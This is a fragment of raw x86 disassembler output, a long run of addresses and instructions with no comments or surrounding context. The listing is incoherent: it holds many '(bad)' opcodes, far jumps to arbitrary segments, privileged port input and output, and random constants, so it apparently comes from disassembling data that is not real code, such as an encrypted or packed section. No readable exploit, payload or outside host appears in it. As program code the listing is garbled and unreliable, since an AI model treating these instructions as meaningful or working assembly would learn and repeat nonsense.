  40b5df:	or     ch,ah
  40b5e1:	fmul   DWORD PTR [esi+edi*8]
  40b5e4:	scas   al,BYTE PTR es:[edi]
  40b5e5:	cmp    eax,0xa48c16bd
  40b5ea:	inc    edx
  40b5eb:	sbb    eax,0x825ae99d
  40b5f0:	inc    ebx
  40b5f1:	xchg   DWORD PTR [edi+eiz*1],eax
  40b5f4:	sbb    esp,DWORD PTR [ebp-0x48]
  40b5f7:	xchg   ebx,eax
  40b5f8:	adc    al,BYTE PTR [edi]
  40b5fa:	imul   edi,DWORD PTR [edx+ebp*2+0x18],0xffffffdf
  40b5ff:	jne    0x40b5b9
  40b601:	fwait
  40b602:	int    0x36
  40b604:	out    dx,eax
  40b605:	push   esi
  40b606:	xor    cl,BYTE PTR [esi+0x6a384e5f]
  40b60c:	cmp    DWORD PTR [ecx+0x6fe249bb],0x3c
  40b613:	test   ebp,0x66b4ebac
  40b619:	and    ecx,DWORD PTR [ecx]
  40b61b:	pop    edx
  40b61c:	cmp    DWORD PTR [edx+0x6b],0xffffffc6
  40b620:	xlat   BYTE PTR ds:[ebx]
  40b621:	sub    DWORD PTR [ebx-0x12],ebx
  40b624:	adc    esi,DWORD PTR [ecx+0x55]
  40b627:	data16 adc dl,BYTE PTR [edi+0x54d54273]
  40b62e:	push   es
  40b62f:	mov    esi,0xfbf141e6
  40b634:	ret    
  40b635:	xchg   ebx,eax
  40b636:	aad    0x1
  40b638:	mov    esi,eax
  40b63a:	outs   dx,DWORD PTR ds:[esi]
  40b63b:	jp     0x40b66f
  40b63d:	jl     0x40b5cd
  40b63f:	adc    bh,BYTE PTR [esi+0x5f7b2475]
  40b645:	daa    
  40b646:	mov    bh,0x41
  40b648:	icebp  
  40b649:	mov    esp,0xd7f99aa6
  40b64e:	push   esi
  40b64f:	push   ds
  40b650:	adc    eax,esi
  40b652:	leave  
  40b653:	fnstenv [ecx-0x68]
  40b656:	jmp    0xe965:0x392cb61c
  40b65d:	scas   eax,DWORD PTR es:[edi]
  40b65e:	pop    esi
  40b65f:	add    BYTE PTR [esi+ebp*2-0x17],bl
  40b663:	xor    al,0x6
  40b665:	mov    ebx,0x2630a562
  40b66a:	jno    0x40b610
  40b66c:	ds cld 
  40b66e:	cwde   
  40b66f:	rol    BYTE PTR [ecx-0x63f87a60],cl
  40b675:	xchg   ebp,eax
  40b676:	ret    
  40b677:	cli    
  40b678:	cmp    al,0xcf
  40b67a:	and    al,0x46
  40b67c:	mov    bh,0x5b
  40b67e:	mov    bh,0x7b
  40b680:	ins    BYTE PTR es:[edi],dx
  40b681:	dec    esi
  40b682:	jae    0x40b625
  40b684:	fdiv   QWORD PTR [ecx]
  40b686:	sbb    eax,0xe67de7c3
  40b68b:	(bad)  
  40b68c:	push   ss
  40b68d:	inc    ebp
  40b68e:	test   al,0x30
  40b690:	hlt    
  40b691:	cli    
  40b692:	jb     0x40b625
  40b694:	fild   QWORD PTR [esi-0x59]
  40b697:	fstp   DWORD PTR [ebx+0x3]
  40b69a:	es call 0x241d158d
  40b6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6a1:	ret    
  40b6a2:	mov    WORD PTR [ebp-0x70b479dd],?
  40b6a8:	loope  0x40b68f
  40b6aa:	cmp    edi,esp
  40b6ac:	mov    ds:0x245ed81e,al
  40b6b1:	or     DWORD PTR [eiz*8-0x2cfd0e3f],esi
  40b6b8:	test   eax,0x77be3f8d
  40b6bd:	repnz lds eax,FWORD PTR [ebp-0x56272d5c]
  40b6c4:	pop    ds
  40b6c5:	or     ah,ah
  40b6c7:	mov    ds:0xb0c6935f,eax
  40b6cc:	cwde   
  40b6cd:	into   
  40b6ce:	scas   eax,DWORD PTR es:[edi]
  40b6cf:	push   ecx
  40b6d0:	fcom   QWORD PTR [edx+ebp*4]
  40b6d3:	mov    edi,0xd769d48b
  40b6d8:	imul   DWORD PTR [ebx]
  40b6da:	shr    DWORD PTR ds:0xcc0ae50,0x3f
  40b6e1:	in     al,dx
  40b6e2:	adc    bl,BYTE PTR [esi-0x1e]
  40b6e5:	fcomp  DWORD PTR ds:0xeb082bf2
  40b6eb:	xor    DWORD PTR [ebp-0x22],edx
  40b6ee:	rcr    DWORD PTR [edx],cl
  40b6f0:	jno    0x40b6ca
  40b6f2:	and    eax,0x95a0a326
  40b6f7:	mov    al,0x4f
  40b6f9:	lods   al,BYTE PTR ds:[esi]
  40b6fa:	gs jp  0x40b776
  40b6fd:	or     esp,DWORD PTR [ecx-0x58984ab8]
  40b703:	neg    DWORD PTR [esi-0x45]
  40b706:	jmp    0x4ac5:0xbf551aba
  40b70d:	lods   al,BYTE PTR ds:[esi]
  40b70e:	ja     0x40b72c
  40b710:	addr16 sub eax,0x434ab315
  40b716:	and    cl,BYTE PTR [eax-0x7d1fcab0]
  40b71c:	pop    esp
  40b71d:	push   ss
  40b71e:	push   ecx
  40b71f:	mov    eax,0x3c40ee8d
  40b724:	adc    al,0x19
  40b726:	test   eax,0xb3baebb9
  40b72b:	sub    al,0x9f
  40b72d:	xor    edi,DWORD PTR [edi+0x29e40fd7]
  40b733:	xor    al,0x67
  40b735:	fstp   QWORD PTR [edx-0x1a80b198]
  40b73b:	(bad)  
  40b73c:	dec    esp
  40b73d:	cmc    
  40b73e:	in     al,0x29
  40b740:	sub    eax,0xe6a5c294
  40b745:	out    dx,eax
  40b746:	dec    edi
  40b747:	add    al,0xe9
  40b749:	fist   DWORD PTR [ebp+0x3e691a3e]
  40b74f:	and    al,0x64
  40b751:	daa    
  40b752:	inc    edx
  40b753:	repnz pushf 
  40b755:	sbb    eax,0xe51ec17b
  40b75a:	mov    dh,0xb4
  40b75c:	xchg   esp,eax
  40b75d:	movnti DWORD PTR [ebp-0x3f3a34c2],ebp
  40b764:	loopne 0x40b730
  40b766:	cmp    BYTE PTR [ebp+0x27f2a805],al
  40b76c:	sub    bh,BYTE PTR [ecx]
  40b76e:	(bad)
  40b771:	stos   DWORD PTR es:[edi],eax
  40b772:	push   ecx
  40b773:	mov    ebp,0xd1b4629d
  40b778:	repz cmp eax,esp
  40b77b:	addr16 retf 0xa35a
  40b77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b780:	mov    al,ds:0xe97a8072
  40b785:	sbb    ch,BYTE PTR [esi-0x16]
  40b788:	sub    BYTE PTR [edx-0x29],ah
  40b78b:	pop    eax
  40b78c:	push   eax
  40b78d:	out    0x4c,al
  40b78f:	xor    eax,0x3b4f8104
  40b794:	js     0x40b7c1
  40b796:	adc    eax,0x7a56a0e9
  40b79b:	lea    ebp,ds:0x5f7d3d6b
  40b7a1:	mov    dl,0xe7
  40b7a3:	lods   al,BYTE PTR ds:[esi]
  40b7a4:	push   0x5f
  40b7a6:	xor    DWORD PTR [ebx+0x33],0xffffffde
  40b7aa:	mov    bh,0x16
  40b7ac:	loop   0x40b771
  40b7ae:	jg     0x40b74a
  40b7b0:	and    BYTE PTR [edx],dl
  40b7b2:	xor    eax,0x750f4e5a
  40b7b7:	push   edi
  40b7b8:	cmp    al,0x78
  40b7ba:	cs cld 
  40b7bc:	adc    ebx,eax
  40b7be:	jp     0x40b835
  40b7c0:	inc    eax
  40b7c1:	scas   al,BYTE PTR es:[edi]
  40b7c2:	stc    
  40b7c3:	into   
  40b7c4:	sbb    DWORD PTR [edx-0x1d],0xaf3b970e
  40b7cb:	xchg   ecx,eax
  40b7cc:	pop    esi
  40b7cd:	in     eax,0xb5
  40b7cf:	ds adc al,0x2c
  40b7d2:	nop
  40b7d3:	xor    DWORD PTR [ebx+0x6d],esi
  40b7d6:	in     al,0xd1
  40b7d8:	mov    al,0xe4
  40b7da:	and    BYTE PTR [ecx+0x773d81d0],bh
  40b7e0:	add    bh,bl
  40b7e2:	add    BYTE PTR [ebx+0x4d04dea2],cl
  40b7e8:	jg     0x40b822
  40b7ea:	ret    0xee65
  40b7ed:	mov    gs,WORD PTR [eax+eiz*8+0x1d]
  40b7f1:	pop    ss
  40b7f2:	push   ebx
  40b7f3:	cmp    edx,edi
  40b7f5:	adc    edi,DWORD PTR [edi]
  40b7f7:	lock dec esi
  40b7f9:	loope  0x40b7f8
  40b7fb:	dec    ebx
  40b7fc:	push   0x20a9d483
  40b801:	(bad)  
  40b802:	cdq    
  40b803:	mov    eax,0x7b48296f
  40b808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b809:	add    ebp,ebx
  40b80b:	out    dx,eax
  40b80c:	mov    ah,0x83
  40b80e:	gs cmp eax,0x24b34499
  40b814:	sbb    al,0x90
  40b816:	and    eax,0xb135b571
  40b81b:	push   esp
  40b81c:	jno    0x40b7f7
  40b81e:	inc    eax
  40b81f:	xchg   esp,eax
  40b820:	mov    ebx,0xc2da586
  40b825:	ins    BYTE PTR es:[edi],dx
  40b826:	loop   0x40b80c
  40b828:	add    DWORD PTR [ecx-0x1dc2db95],eax
  40b82e:	xor    al,0xe9
  40b830:	out    dx,al
  40b831:	xor    BYTE PTR [eax],al
  40b833:	in     eax,0x13
  40b835:	outs   dx,BYTE PTR ds:[esi]
  40b836:	sbb    esi,DWORD PTR [edi]
  40b838:	mov    ebp,0x40f3d14
  40b83d:	es add al,ah
  40b840:	(bad)  
  40b841:	ja     0x40b81d
  40b843:	enter  0x6dc,0x4f
  40b847:	loopne 0x40b869
  40b849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b84a:	loopne 0x40b7ed
  40b84c:	push   esi
  40b84d:	lock push ebx
  40b84f:	les    ebx,FWORD PTR [eax]
  40b851:	xor    eax,0x739516e2
  40b856:	mov    ebx,0x97b0a9c2
  40b85b:	fadd   st(5),st
  40b85d:	ja     0x40b7e3
  40b85f:	sbb    DWORD PTR [eax-0x7d302ed4],edx
  40b865:	inc    ebp
  40b866:	jno    0x40b820
  40b868:	xchg   ebx,eax
  40b869:	leave  
  40b86a:	mov    WORD PTR [ebx-0x7ba84a74],es
  40b870:	ins    DWORD PTR es:[edi],dx
  40b871:	xor    BYTE PTR [ebp+0x45],cl
  40b874:	fidivr DWORD PTR [esi+0x3ab8f753]
  40b87a:	cwde   
  40b87b:	jno    0x40b83c
  40b87d:	aaa    
  40b87e:	clc    
  40b87f:	dec    esi
  40b880:	mov    cl,0xe5
  40b882:	fcomp  QWORD PTR [eax-0x7ffad05a]
  40b888:	jb     0x40b81d
  40b88a:	or     eax,0x6fef3a76
  40b88f:	sub    eax,0xb60fad62
  40b894:	pop    ecx
  40b895:	fcmovbe st,st(3)
  40b897:	sub    al,0xf3
  40b899:	cs aaa 
  40b89b:	add    al,0xcd
  40b89d:	fdivr  DWORD PTR [eax-0x2f]
  40b8a0:	(bad)  
  40b8a1:	call   0x4ed:0xb735c0ac
  40b8a8:	fwait
  40b8a9:	push   cs
  40b8aa:	fimul  DWORD PTR [edi-0x862fa0e]
  40b8b0:	ficomp DWORD PTR [esi+0x4773336]
  40b8b6:	add    eax,0xe3fe4a0c
  40b8bb:	dec    esi
  40b8bc:	dec    esp
  40b8bd:	daa    
  40b8be:	out    dx,eax
  40b8bf:	(bad)  
  40b8c1:	je     0x40b912
  40b8c3:	or     DWORD PTR [edx],eax
  40b8c5:	into   
  40b8c6:	dec    esi
  40b8c7:	sar    DWORD PTR [ecx+0x52],1
  40b8ca:	stos   DWORD PTR es:[edi],eax
  40b8cb:	push   edi
  40b8cc:	hlt    
  40b8cd:	or     eax,0xa96130a8
  40b8d2:	outs   dx,DWORD PTR ds:[esi]
  40b8d3:	xlat   BYTE PTR ds:[ebx]
  40b8d4:	mov    edx,0xb98dd7fc
  40b8d9:	stos   DWORD PTR es:[edi],eax
  40b8da:	xchg   edx,eax
  40b8db:	stos   DWORD PTR es:[edi],eax
  40b8dc:	(bad)  
  40b8dd:	xor    BYTE PTR [eax],cl
  40b8df:	push   ebp
  40b8e0:	inc    ebp
  40b8e1:	mov    esp,esp
  40b8e3:	pop    eax
  40b8e4:	(bad)  
  40b8e5:	mov    ebp,0xda487cb4
  40b8ea:	dec    esp
  40b8eb:	mov    ds:0xced2e78e,eax
  40b8f0:	or     dh,cl
  40b8f2:	mov    dl,0x3b
  40b8f4:	mov    esp,0x42e43f5c
  40b8f9:	jno    0x40b978
  40b8fb:	fcmovb st,st(3)
  40b8fd:	test   BYTE PTR ds:0xba7585a1,dl
  40b903:	arpl   WORD PTR [ebx+0x7b],ax
  40b906:	imul   eax,esi,0x64
  40b909:	mov    cl,BYTE PTR [ecx+0x32]
  40b90c:	iret   
  40b90d:	aad    0x8e
  40b90f:	mov    ah,0xce
  40b911:	push   0x9ff73660
  40b916:	nop
  40b917:	daa    
  40b918:	ret    
  40b919:	inc    ebp
  40b91a:	adc    al,0x79
  40b91c:	xchg   ecx,esi
  40b91e:	test   BYTE PTR [edx],0xa1
  40b921:	sub    bl,BYTE PTR [esi-0x4326ee81]
  40b927:	mov    dl,0x82
  40b929:	dec    ecx
  40b92a:	inc    edi
  40b92b:	cmp    DWORD PTR [edx+0x4ebcaf1],ebp
  40b931:	(bad)  
  40b932:	dec    esi
  40b933:	sbb    DWORD PTR [edx-0x48],0x2f
  40b937:	push   es
  40b938:	xchg   esi,eax
  40b939:	xor    edx,DWORD PTR [eax-0x8]
  40b93c:	jmp    0x40b98a
  40b93e:	or     cl,BYTE PTR [ebx]
  40b940:	cli    
  40b941:	loope  0x40b96f
  40b943:	or     al,0x61
  40b945:	dec    edx
  40b946:	add    eax,esp
  40b948:	repnz (bad) 
  40b94a:	fcmovne st,st(2)
  40b94c:	inc    ecx
  40b94d:	sbb    eax,0x684b5b44
  40b952:	or     eax,0xad68f2f6
  40b957:	test   DWORD PTR [edx+eax*2],ebx
  40b95a:	xchg   edx,eax
  40b95b:	ins    BYTE PTR es:[edi],dx
  40b95c:	fnstenv [esi-0x493cd0c1]
  40b962:	arpl   WORD PTR [ebx+0x64eab6fc],sp
  40b968:	jbe    0x40b90d
  40b96a:	add    eax,DWORD PTR [ecx]
  40b96c:	jmp    0x80707384
  40b971:	inc    ebx
  40b972:	mov    eax,0xef7d74e1
  40b977:	sbb    ch,BYTE PTR [eax]
  40b979:	pop    eax
  40b97a:	mov    dh,ah
  40b97c:	les    esp,FWORD PTR [ebp+0x5b5ca6ea]
  40b982:	xlat   BYTE PTR ds:[ebx]
  40b983:	imul   ebx,DWORD PTR [ecx],0x2a
  40b986:	ret    
  40b987:	out    dx,eax
  40b988:	pop    ecx
  40b989:	push   cs
  40b98a:	fdivr  QWORD PTR [ecx-0x5ab3a02b]
  40b990:	loopne 0x40b9b7
  40b992:	mov    dh,0x77
  40b994:	mov    al,ds:0xc0f77aa4
  40b999:	retf   0x873b
  40b99c:	jne    0x40b9d4
  40b99e:	gs (bad) 
  40b9a0:	outs   dx,BYTE PTR ds:[esi]
  40b9a1:	xor    DWORD PTR [ebp+0x268bade0],ebp
  40b9a7:	inc    esp
  40b9a8:	mov    cl,0x2b
  40b9aa:	sbb    al,0x7f
  40b9ac:	call   0xa8409af5
  40b9b1:	aas    
  40b9b2:	push   esp
  40b9b3:	inc    esi
  40b9b4:	push   esi
  40b9b5:	mov    esi,0x1a5fa1fd
  40b9ba:	xchg   edx,eax
  40b9bb:	add    BYTE PTR [eiz*2+0x20c9f1d6],0xb5
  40b9c3:	bound  eax,QWORD PTR [ecx+0x7f]
  40b9c6:	cs sub ecx,0xffffffeb
  40b9ca:	or     BYTE PTR [eax+0x4135def5],ah
  40b9d0:	push   esp
  40b9d1:	in     eax,0xa8
  40b9d3:	scas   eax,DWORD PTR es:[edi]
  40b9d4:	ins    BYTE PTR es:[edi],dx
  40b9d5:	int    0x8a
  40b9d7:	call   0xb200:0x386379a5
  40b9de:	xor    ebp,DWORD PTR [ebx]
  40b9e0:	imul   eax,eax,0xc2896bc0
  40b9e6:	sub    al,0xc2
  40b9e8:	retf   0xc44f
  40b9eb:	mov    ds:0x96fa62da,eax
  40b9f0:	imul   edi,esp,0x12be04a7
  40b9f6:	push   ebp
  40b9f7:	fnstcw WORD PTR [ebp+0xe]
  40b9fa:	ins    DWORD PTR es:[edi],dx
  40b9fb:	shl    DWORD PTR [edi],1
  40b9fd:	fwait
  40b9fe:	add    al,0xe4
  40ba00:	xchg   edi,eax
  40ba01:	and    BYTE PTR [eax],al
  40ba03:	jns    0x40ba27
  40ba05:	jp     0x40ba19
  40ba07:	sub    ah,cl
  40ba09:	sub    al,0x2b
  40ba0b:	inc    edx
  40ba0c:	in     eax,0x30
  40ba0e:	jmp    0xbdfd:0x852eb9b7
  40ba15:	inc    esi
  40ba16:	fsub   QWORD PTR [esi+0xd53a2e1]
  40ba1c:	sub    eax,0x67d0e704
  40ba21:	daa    
  40ba22:	fistp  DWORD PTR [ebx+eiz*4-0x5e]
  40ba26:	repnz push es
  40ba28:	pop    es
  40ba29:	cmp    ah,ch
  40ba2b:	pop    DWORD PTR [ebp-0x656e93]
  40ba31:	and    esp,DWORD PTR [edi+0x67]
  40ba34:	jae    0x40b9e6
  40ba36:	cmc    
  40ba37:	retf   0x8a09
  40ba3a:	(bad)  
  40ba3b:	out    dx,eax
  40ba3c:	jmp    0x8123:0xfb3c0185
  40ba43:	push   0x8a2c496f
  40ba48:	(bad)  
  40ba49:	or     al,0xd1
  40ba4b:	cmp    eax,0xb11933fc
  40ba50:	stc    
  40ba51:	dec    ebx
  40ba52:	lock lea edi,[esi]
  40ba55:	sub    eax,0xd6e5b36b
  40ba5a:	outs   dx,DWORD PTR ds:[esi]
  40ba5b:	jp     0x40b9ef
  40ba5d:	(bad)  
  40ba5e:	(bad)  
  40ba5f:	push   esi
  40ba60:	repz es das 
  40ba63:	cli    
  40ba64:	ds cmp al,0x38
  40ba67:	mov    al,0x60
  40ba69:	cwde   
  40ba6a:	stc    
  40ba6b:	and    al,0x21
  40ba6d:	push   edi
  40ba6e:	xchg   ebp,eax
  40ba6f:	mov    bh,0x33
  40ba71:	in     al,0xcc
  40ba73:	fidivr DWORD PTR [edi]
  40ba75:	test   bh,al
  40ba77:	jns    0x40bad8
  40ba79:	adc    BYTE PTR [eax-0x71a0182c],dl
  40ba7f:	inc    esi
  40ba80:	and    DWORD PTR [ebp+0x69],eax
  40ba83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba84:	mov    dh,BYTE PTR [ecx+0x410ae6a1]
  40ba8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba8c:	sti    
  40ba8d:	stc    
  40ba8e:	call   0xd3e0:0x9b492880
  40ba95:	and    eax,0x9a7968c2
  40ba9a:	jecxz  0x40bb18
  40ba9c:	mov    dl,0xa3
  40ba9e:	pushf  
  40ba9f:	ja     0x40ba5b
  40baa1:	and    dl,BYTE PTR [esp+edx*1+0x26d500aa]
  40baa8:	sub    al,0x29
  40baaa:	arpl   WORD PTR [ebp+0x6c],bp
  40baad:	lods   eax,DWORD PTR ds:[esi]
  40baae:	sahf   
  40baaf:	inc    ebp
  40bab0:	retf   
  40bab1:	mov    eax,ds:0x81879ab4
  40bab6:	xor    eax,0x2c56e223
  40babb:	jmp    0x24a738e8
  40bac0:	(bad)  [esi]
  40bac2:	stos   DWORD PTR es:[edi],eax
  40bac3:	cli    
  40bac4:	fnstenv [eax]
  40bac6:	mov    al,ds:0x13e1c79b
  40bacb:	ins    BYTE PTR es:[edi],dx
  40bacc:	in     al,0xb1
  40bace:	mov    ecx,0xa701232a
  40bad3:	fadd   st(2),st
  40bad5:	lock std 
  40bad7:	pop    ds
  40bad8:	jp     0x40ba7e
  40bada:	lods   al,BYTE PTR ds:[esi]
  40badb:	jecxz  0x40badd
  40badd:	cli    
  40bade:	idiv   DWORD PTR [edx]
  40bae0:	int    0xa4
  40bae2:	mov    WORD PTR [ebx-0x7f],?
  40bae5:	dec    edi
  40bae6:	xchg   ebp,eax
  40bae7:	icebp  
  40bae8:	mov    eax,ds:0x3f71eb05
  40baed:	int3   
  40baee:	mov    ebp,0x203bfc5d
  40baf3:	enter  0x9698,0xe6
  40baf7:	jecxz  0x40bafd
  40baf9:	out    dx,eax
  40bafa:	ret    
  40bafb:	(bad)  
  40bafc:	call   0x5ccb:0xefb11e92
  40bb03:	fmul   DWORD PTR [ecx]
  40bb05:	lods   eax,DWORD PTR ds:[esi]
  40bb06:	jns    0x40bb01
  40bb08:	pop    es
  40bb09:	xchg   esp,ebx
  40bb0b:	mov    cl,0xf7
  40bb0d:	out    0x14,eax
  40bb0f:	push   0x53
  40bb11:	jecxz  0x40bad6
  40bb13:	mov    eax,ds:0x8297eb64
  40bb18:	lea    edx,ds:0x6f3fba6b
  40bb1e:	sub    ebp,DWORD PTR [ecx]
  40bb20:	scas   al,BYTE PTR es:[edi]
  40bb21:	xchg   esi,eax
  40bb22:	mov    dh,0xfe
  40bb24:	into   
  40bb25:	inc    esi
  40bb26:	shl    DWORD PTR [edi],1
  40bb28:	(bad)  
  40bb29:	push   ebp
  40bb2a:	add    esi,ecx
  40bb2c:	jb     0x40baf7
  40bb2e:	js     0x40babf
  40bb30:	mov    edi,0x8cf2b1c7
  40bb35:	and    eax,0xcbf31dcb
  40bb3a:	cmp    al,0xb4
  40bb3c:	dec    esi
  40bb3d:	sbb    ah,BYTE PTR [esp+eax*1]
  40bb40:	fst    DWORD PTR [ecx]
  40bb42:	ins    BYTE PTR es:[edi],dx
  40bb43:	or     DWORD PTR [esi-0x707a50ae],eax
  40bb49:	add    al,BYTE PTR [eax+0x3e]
  40bb4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb4d:	xchg   esp,eax
  40bb4e:	jbe    0x40bb61
  40bb50:	sub    al,0x83
  40bb52:	in     al,dx
  40bb53:	and    ebp,edi
  40bb55:	inc    ebp
  40bb56:	cwde   
  40bb57:	dec    edi
  40bb58:	jle    0x40bb7b
  40bb5a:	fisubr WORD PTR [ebp-0x2c]
  40bb5d:	pop    esi
  40bb5e:	gs cs in eax,0x24
  40bb62:	in     eax,0x8f
  40bb64:	gs inc esp
  40bb66:	js     0x40bb29
  40bb68:	xor    ecx,DWORD PTR [edx+0x44076b61]
  40bb6e:	outs   dx,BYTE PTR ds:[esi]
  40bb6f:	js     0x40bb6d
  40bb71:	shl    DWORD PTR [ebp+edi*2+0x11],cl
  40bb75:	pop    ds
  40bb76:	jmp    0xd86a1c3f
  40bb7b:	jp     0x40bb53
  40bb7d:	test   BYTE PTR [ecx],ah
  40bb7f:	cmp    BYTE PTR [ebx+0x3306a565],bh
  40bb85:	sbb    DWORD PTR [ebp+0x186c2366],edi
  40bb8b:	or     esi,esi
  40bb8d:	mov    esi,0xb330ac9f
  40bb92:	fcom   QWORD PTR [ebx-0xafaf845]
  40bb98:	adc    eax,0x7777f476
  40bb9d:	fsub   QWORD PTR [ebp+0x3dcde790]
  40bba3:	xchg   ebx,eax
  40bba4:	sub    dl,BYTE PTR [edx]
  40bba6:	sbb    al,0x3c
  40bba8:	push   0x9997bdcb
  40bbad:	fisttp QWORD PTR [eax+0x3c]
  40bbb0:	es js  0x40bb6e
  40bbb3:	xor    BYTE PTR [eax+0x4a],dl
  40bbb6:	inc    edx
  40bbb7:	pop    edx
  40bbb8:	shl    ebx,1
  40bbba:	hlt    
  40bbbb:	icebp  
  40bbbc:	inc    esp
  40bbbd:	cli    
  40bbbe:	sub    eax,0x781acf19
  40bbc3:	mov    cl,0x56
  40bbc5:	imul   eax,DWORD PTR [ebp-0x26b32218],0xca4a5ce4
  40bbcf:	iret   
  40bbd0:	test   eax,0x78e45f5c
  40bbd5:	sbb    bh,dh
  40bbd7:	in     eax,dx
  40bbd8:	rcl    BYTE PTR [edx-0x26],cl
  40bbdb:	mov    gs,WORD PTR [esi+esi*2+0x69b12716]
  40bbe2:	mov    dh,0x7c
  40bbe4:	stos   DWORD PTR es:[edi],eax
  40bbe5:	fwait
  40bbe6:	out    0xac,al
  40bbe8:	mov    ch,BYTE PTR [ebx+0x5e]
  40bbeb:	int3   
  40bbec:	imul   ebx,DWORD PTR [ecx-0x453ae51c],0x13005cbf
  40bbf6:	fisubr WORD PTR [edi-0x25033318]
  40bbfc:	int3   
  40bbfd:	sub    dl,bh
  40bbff:	ds (bad) 
  40bc01:	out    dx,eax
  40bc02:	(bad)  
  40bc03:	lock sbb al,0xf2
  40bc06:	and    edi,DWORD PTR [edi]
  40bc08:	xchg   edi,eax
  40bc09:	mov    ds:0x1ccfe6cf,al
  40bc0e:	fcom   QWORD PTR [eax+0x3b440648]
  40bc14:	aad    0xf6
  40bc16:	push   edx
  40bc17:	jns    0x40bc1c
  40bc19:	or     eax,0xc035118d
  40bc1e:	mov    ds:0xf819d9b5,eax
  40bc23:	sbb    DWORD PTR [edi+0x13],0x78005971
  40bc2a:	mov    ch,0x28
  40bc2c:	push   es
  40bc2d:	jg     0x40bbf6
  40bc2f:	imul   esp,DWORD PTR [ebx-0x6],0xc
  40bc33:	enter  0xef4e,0xfd
  40bc37:	inc    edi
  40bc38:	jl     0x40bc59
  40bc3a:	jmp    0x7f41:0x949f947f
  40bc41:	xlat   BYTE PTR ds:[ebx]
  40bc42:	mov    bl,bl
  40bc44:	repz dec ebp
  40bc46:	test   eax,0xee563e0b
  40bc4b:	mov    ds:0x58f1a34b,eax
  40bc50:	loopne 0x40bc70
  40bc52:	stos   DWORD PTR es:[edi],eax
  40bc53:	repz xchg ecx,esp
  40bc56:	bnd jae 0x40bc9b
  40bc59:	(bad)  
  40bc5a:	jmp    0xcf305533
  40bc5f:	fcom   QWORD PTR [eax+0x72be52ab]
  40bc65:	jmp    0x8cf966d7
  40bc6a:	pop    edx
  40bc6b:	ja     0x40bc43
  40bc6d:	inc    ebx
  40bc6e:	sbb    cl,dl
  40bc70:	mov    DWORD PTR [edi-0x10],0x5a8dabec
  40bc77:	jnp    0x40bc7a
  40bc79:	jmp    0xf2e4cdb3
  40bc7e:	dec    eax
  40bc7f:	pop    es
  40bc80:	(bad)  [eax]
  40bc82:	inc    ebp
  40bc83:	and    al,0xff
  40bc85:	lds    esi,FWORD PTR [edi-0xe]
  40bc88:	je     0x40bc9f
  40bc8a:	cld    
  40bc8b:	inc    ecx
  40bc8c:	push   edi
  40bc8d:	add    eax,0x96937a83
  40bc92:	ror    DWORD PTR [edi+0x8516a39],0xac
  40bc99:	jp     0x40bc8d
  40bc9b:	or     bl,dl
  40bc9d:	sbb    BYTE PTR [ecx+esi*8-0x66ab8720],0x85
  40bca5:	loopne 0x40bc3c
  40bca7:	ins    BYTE PTR es:[edi],dx
  40bca8:	cld    
  40bca9:	adc    cl,ah
  40bcab:	xchg   esi,eax
  40bcac:	jmp    0x4a5a:0x91e88714
  40bcb3:	scas   al,BYTE PTR es:[edi]
  40bcb4:	mov    BYTE PTR [edi+edi*2],ah
  40bcb7:	test   eax,esp
  40bcb9:	sbb    esp,ebx
  40bcbb:	adc    DWORD PTR [edi+0x7e],ecx
  40bcbe:	inc    ebp
  40bcbf:	lods   al,BYTE PTR ds:[esi]
  40bcc0:	inc    eax
  40bcc1:	in     al,0x89
  40bcc3:	pop    ebp
  40bcc4:	lahf   
  40bcc5:	cmp    ch,BYTE PTR [ecx+ecx*4]
  40bcc8:	sub    ecx,DWORD PTR [eax+0x71]
  40bccb:	gs jecxz 0x40bc8e
  40bcce:	sbb    cl,dl
  40bcd0:	test   ebp,esp
  40bcd2:	fiadd  WORD PTR [ecx+ebx*2-0x3a]
  40bcd6:	out    0x8b,eax
  40bcd8:	pop    ss
  40bcd9:	pop    edi
  40bcda:	out    dx,eax
  40bcdb:	or     BYTE PTR [ebx+0x0],dl
  40bcde:	and    DWORD PTR [edi+ebx*1],edi
  40bce1:	fucomp st(3)
  40bce3:	pmaxsw mm1,mm0
  40bce6:	ins    DWORD PTR es:[edi],dx
  40bce7:	bound  ecx,QWORD PTR [ecx]
  40bce9:	inc    eax
  40bcea:	in     eax,0x32
  40bcec:	dec    ebx
  40bced:	stos   BYTE PTR es:[edi],al
  40bcee:	(bad)  
  40bcef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf0:	xor    ebp,DWORD PTR [eax]
  40bcf2:	ins    BYTE PTR es:[edi],dx
  40bcf3:	fdivr  QWORD PTR [edi-0x54d12f6e]
  40bcf9:	icebp  
  40bcfa:	jbe    0x40bc86
  40bcfc:	nop
  40bcfd:	cmc    
  40bcfe:	ret    0x253c
  40bd01:	xor    DWORD PTR [ecx+0x5a],edi
  40bd04:	cmp    al,0xe4
  40bd06:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40bd08:	cmp    eax,0x2ea207a7
  40bd0d:	jecxz  0x40bd39
  40bd0f:	popf   
  40bd10:	sbb    BYTE PTR [edi-0x8],0xc4
  40bd14:	pop    esp
  40bd15:	stos   DWORD PTR es:[edi],eax
  40bd16:	ins    DWORD PTR es:[edi],dx
  40bd17:	cmp    ah,al
  40bd19:	jle    0x40bd3a
  40bd1b:	dec    esp
  40bd1c:	cmp    DWORD PTR [esp+ecx*1-0x77],0x9ea5972d
  40bd24:	test   BYTE PTR [esi],dh
  40bd26:	push   edx
  40bd27:	js     0x40bd46
  40bd29:	rcr    dl,1
  40bd2b:	js     0x40bcf3
  40bd2d:	(bad)  
  40bd2e:	out    0xe4,al
  40bd30:	das    
  40bd31:	push   esi
  40bd32:	lods   eax,DWORD PTR ds:[esi]
  40bd33:	in     al,dx
  40bd34:	lock addr16 aam 0x76
  40bd38:	add    eax,0x338f738e
  40bd3d:	jb     0x40bd13
  40bd3f:	jns    0x40bdb0
  40bd41:	inc    esp
  40bd42:	mov    ah,0x76
  40bd44:	popf   
  40bd45:	test   eax,0x4c3fa94e
  40bd4a:	out    0x66,eax
  40bd4c:	retf   0x5d4
